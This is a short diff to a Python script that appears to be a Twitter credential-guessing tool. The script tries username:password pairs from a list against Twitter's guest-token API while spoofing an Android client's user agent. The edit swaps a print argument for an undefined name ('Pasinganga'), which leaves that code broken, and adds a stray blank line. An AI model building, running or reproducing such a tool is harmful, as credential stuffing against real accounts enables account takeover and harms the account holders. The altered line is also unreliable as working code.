@@ -31,7 +31,7 @@ print(banner)
 def Guess_without_proxies(user,pasw):
     global hunt,error,bad,banner
     try:
-        print(Y+f'[-] {user}:{pasw}')
+        print(Y+f'[-] {Pasinganga}:{pasw}')
         token_url = 'https://api.twitter.com/1.1/guest/activate.json'
         token_hed = {
             'User-Agent': 'TwitterAndroid/8.87.0-release.01 (28870001-r-1) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2012)',
@@ -187,4 +187,5 @@ else:
             pasw = account.split(':')[1]
             Guess_without_proxies(user,pasw)
         except:
+
             pass
